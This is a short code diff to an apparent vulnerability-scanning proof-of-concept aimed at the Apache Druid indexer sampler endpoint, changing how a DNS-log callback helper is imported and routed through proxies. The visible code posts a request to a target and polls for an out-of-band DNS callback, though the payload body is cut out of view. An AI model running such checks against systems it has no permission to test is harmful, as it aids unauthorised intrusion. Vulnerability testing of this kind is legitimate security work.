@@ -20,7 +20,7 @@ from requests.packages.urllib3 import disable_warnings
 disable_warnings()
 path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(path)
-from modules.dnslog import dnslogs
+from modules.dnslogs import dnslogs
 
 
 class poc:
@@ -40,7 +40,7 @@ class poc:
         return netloc, scheme
 
     def vuln(self, netloc, scheme):
-        dnslog_all = dnslogs().get_dnslog()
+        dnslog_all = dnslogs(self.proxies).get_dnslog()
         dnslog = dnslog_all[0]
         url = "{}://{}/druid/indexer/v1/sampler?for=connect".format(scheme, netloc)
         self.data = f'''%7B
@@ -92,7 +92,7 @@ class poc:
             self.result = requests.post(url=url, data=self.data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
             self.target = urlparse(url)
             for i in range(5):
-                dnslog_result = dnslogs().get_result(dnslog_all[1])
+                dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
                 if dnslog_result != "[]":
                     return True
                 else:
